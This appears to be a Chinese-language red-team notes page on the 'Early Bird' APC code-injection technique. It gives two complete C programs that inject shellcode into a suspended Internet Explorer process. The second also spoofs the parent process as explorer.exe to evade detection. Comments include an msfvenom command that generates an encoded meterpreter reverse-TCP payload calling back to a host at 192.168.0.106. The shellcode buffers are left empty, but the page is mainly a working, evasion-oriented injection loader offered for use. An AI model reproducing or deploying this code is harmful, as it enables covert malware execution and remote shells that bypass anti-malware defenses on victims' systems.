# Early Bird

## Early Bird简介

Early Bird是一种简单而强大的技术，Early Bird本质上是一种APC注入与线程劫持的变体，由于线程初始化时会调用ntdll未导出函数NtTestAlert，该函数会清空并处理APC队列，所以注入的代码通常在进程的主线程的入口点之前运行并接管进程控制权，从而避免了反恶意软件产品的钩子的检测，同时获得一个合法进程的环境信息。

## Early Bird流程

1. 创建一个挂起的进程\(通常是windows的合法进程\)
2. 在挂起的进程内申请一块可读可写可执行的内存空间
3. 往申请的空间内写入shellcode
4. 将APC插入到该进程的主线程
5. 恢复挂起进程的线程

![](../.gitbook/assets/image%20%289%29.png)

## 代码实现

```text
#include <stdio.h>
#include <windows.h>
//msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 14 LHOST=192.168.0.106 EXITFUNC=thread -f
unsigned char shellcode[] = "";
int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFO);

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
    QueueUserAPC((PAPCFUNC)lpBaseAddress, pi.hThread, NULL);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);

    return 0;
}
```

## 配合FakePPID和FakeCurrentDirectory使用

```text
#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>


DWORD FindExplorerPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {

    //msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 14 LHOST=192.168.0.106 EXITFUNC=thread -f
    unsigned char shellcode[] = ("");


    STARTUPINFOEXA siex;
    PROCESS_INFORMATION piex;
    SIZE_T sizeT;
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SetCurrentDirectoryA("C:\\Program Files\\internet explorer\\");

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, FindExplorerPID());

    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL);
    
    
    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&siex, &piex);
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
    QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL);
    ResumeThread(piex.hThread);
    CloseHandle(piex.hThread);

    return 0;
}
```

![](../.gitbook/assets/image%20%2831%29.png)

![](../.gitbook/assets/image%20%286%29.png)

## LINKS

{% embed url="https://www.securitynewspaper.com/2018/04/17/new-early-bird-code-injection-technique/" %}

{% embed url="https://blog.csdn.net/weixin\_42052102/article/details/83348780" %}





